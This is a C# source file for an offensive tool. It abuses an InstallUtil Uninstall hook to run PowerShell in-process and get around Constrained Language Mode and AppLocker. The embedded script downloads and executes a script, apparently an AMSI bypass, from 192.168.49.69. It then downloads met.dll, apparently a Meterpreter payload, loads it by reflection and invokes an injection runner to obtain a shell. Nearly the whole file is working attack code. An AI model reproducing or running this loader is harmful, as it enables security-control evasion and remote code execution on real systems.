using System;
using System.Management.Automation.Runspaces;
using System.Management.Automation;
using System.Collections;

namespace PSLangBypass_InstallUtil_Bypass
{

    class PSLB_InstalUtil_Bypass
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] Powershell Constrained Language should hopefully be bypassed");   
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(IDictionary savedState)
        {
            Console.WriteLine("[*] Attempting Powershell language mode bypass");

            Console.WriteLine("[+] Powershell Constrained Language should hopefully be bypassed");

            // Creating the runspace and opening it
            Runspace rs = RunspaceFactory.CreateRunspace();
            
            // Creating powershell object
            PowerShell ps = PowerShell.Create();

            rs.Open();

            // Getting the LanguageMode of current session and saving to a file
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Windows\\Tasks\\clm.log; iex((new-object system.net.webclient).downloadstring('http://192.168.49.69/amsl.txt')); $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.69/met.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('PS_Reflective_DLL_Inject.PSReflective_DLLInjectRunner');$method = $class.GetMethod('Runner'); $method.Invoke(0, $null)";
            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
            
            //String psamsl = "iex((new-object system.net.webclient).downloadstring('http://192.168.49.69/amsl.txt'))";
            //String shelo = "$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.69/met.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('PS_Reflective_DLL_Inject.PSReflective_DLLInjectRunner');$method = $class.GetMethod('Runner'); $method.Invoke(0, $null)";

            // Below command should allow for automatic shell upon bypassing applocker


            // Initialising the runspace
            ps.Runspace = rs;

            // Running the command above
            try
            {
                // Running the command above
                ps.AddScript(cmd);
                //ps.AddScript(psamsl);
                //ps.AddScript(shelo);
                ps.Invoke();
                // Closing runspace 
                rs.Close();

            } catch (Exception e)
            {
                throw (e);
            }

            //Sleep for a moment
            System.Threading.Thread.Sleep(2000);

            string File = @"C:\Windows\Tasks\clm.log";

            try
            {
                if (System.IO.File.Exists(File))
                {
                    string _File_contents = System.IO.File.ReadAllText(@"C:\Windows\Tasks\clm.log");
                    Console.Write($"[+] Contents of clm.log: \n{_File_contents}\n");
                }
                else
                {
                    Console.WriteLine("[-] File clm.log doesn't exist");
                    Console.WriteLine("[*] Powershell language mode bypass likely didn't succeed.");
                    return;
                }

            }
            catch (Exception e)
            {
                throw (e);
            }
        }
    }
}
